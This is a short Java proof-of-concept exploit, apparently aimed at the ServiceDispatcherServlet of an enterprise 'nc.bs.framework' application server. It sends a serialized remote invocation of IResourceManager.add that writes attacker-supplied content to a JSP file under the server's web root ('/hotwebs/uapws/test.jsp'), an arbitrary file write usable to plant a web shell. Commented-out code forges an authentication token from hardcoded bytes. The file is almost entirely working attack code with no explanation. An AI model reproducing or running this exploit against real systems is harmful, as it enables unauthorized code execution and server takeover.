
import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.comn.NetStreamContext;
import nc.bs.framework.comn.Result;
import nc.bs.framework.exception.ConnectorException;
import nc.bs.framework.rmi.*;
import nc.bs.framework.server.TokenProcessorImpl;



public class ServiceDispatcherServlet_exp1 {

    public static void main(String[] args) throws Throwable {

        String pylaod = "this is test" +
                "</jsp:root>";

        InvocationInfo invocationInfo = new InvocationInfo("->uap.framework.rc.itf.IResourceManager","add",new Class[]{String.class,String.class},new Object[]{pylaod,"/hotwebs/uapws/test.jsp"},"2222222");


        //
        System.setProperty("ncc.myLine","true");
        Address target = new Address("https://127.0.0.1:8443/ServiceDispatcherServlet");
        // 请求流中追加token
//        TokenProcessorImpl  tokenProcessor = new TokenProcessorImpl();
//        byte[] token = tokenProcessor.genToken("NCSystem".getBytes(), "uapesb".getBytes());
//        byte[] pToken = new byte[]{-128, 68, 30, 117, 108, 77, -8, -68, -49, 113, 41, -114, -26, 83, 103, -67};
//        System.arraycopy(pToken,0,token,8,pToken.length);
//        NetStreamContext.setToken(token);
        //
//        HttpRemoteChannelFactory rcf = (HttpRemoteChannelFactory)RemoteChannelFactoryManager.getDefault().getRemoteChannelFactory(target.getProtocol());
        HttpRemoteChannelFactory rcf = new HttpRemoteChannelFactory();
        if (rcf == null) {
            throw new ConnectorException("not support target address:" + target);
        } else {
            RemoteChannel rc = null;
            Result ret = null;

            Object var19;
            try {

                rc = rcf.createRemoteChannel(target);
                rc.init();
                RemoteUtil.writeObject(rc.getOutputStream(), invocationInfo);
                ret = (Result)RemoteUtil.readObject(rc.getInputStream(), (boolean[])null);
                if (ret.appexception != null) {
                    throw ret.appexception;
                }

                var19 = ret.result;
            }  finally {
                if (rc != null) {
                    rc.destroy();
                }
            }

        }

    }
}
